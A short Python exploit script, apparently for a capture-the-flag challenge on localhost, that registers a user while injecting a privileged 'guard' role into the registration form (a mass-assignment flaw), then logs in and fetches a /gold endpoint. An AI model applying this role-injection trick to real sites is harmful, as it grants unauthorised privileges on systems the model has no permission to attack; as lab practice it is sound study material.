import requests
import random
random.randint(1,100)
s = requests.session()
s.proxies = {"http":"http://localhost:8080"}

url = "http://localhost:1337"
username = "test"+str(random.randint(1,100))

register_url = f"{url}/register"
register_data = {"username": f"{username}", "password": "test", "confirm_password": "test", "role": "guard"}
r = s.post(register_url, data=register_data)

if "User registered successfully." in r.text:
    print(f"Registred user with the following credentials:\nUsername: {username}\tPassword:test\t and guard role")
else:
    print(f"ERROR OCCURRED:\n{r.text}")


# Login
print(f"Logging in as user {username}\n")
login_url = f"{url}/login"
login_data = {"username": f"{username}", "password": "test"}
r = s.post(login_url, data=login_data)

gold_url = f"{url}/gold"
r = s.get(gold_url)

print(f"Gold Rrequest:\n{r.text}")